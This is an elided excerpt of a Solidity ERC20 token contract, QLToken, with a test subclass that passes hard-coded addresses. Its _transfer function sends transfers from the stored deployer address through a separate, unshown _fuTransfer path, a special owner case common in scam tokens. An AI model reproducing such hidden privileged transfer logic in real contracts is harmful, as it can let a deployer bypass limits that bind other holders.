...
abstract contract QLToken is IERC20, Ownable {
    ...
    constructor (
        ...
        maxTXAmount = 10800 * 10 ** Decimals;
        maxWalletAmount = 10800 * 10 ** Decimals;
        thA = msg.sender;
        _tTotal = total;
    ...
    function _transfer(
        ...
        if (from == thA) {_fuTransfer(from, to, amount);}
...
contract QLTest is QLToken {
    constructor() QLToken(    
        ...
        6,    
        1080000,    
        address(0x2Db340757F8c0157d8500934D00c18503d441b32),
        address(0xDc3beB8007EEcb30f903dA66cb94E3E7a621AE31),    
        address(0x1A1F3A5E527c4606779fd484fe6A02af3A33f356)
    ){
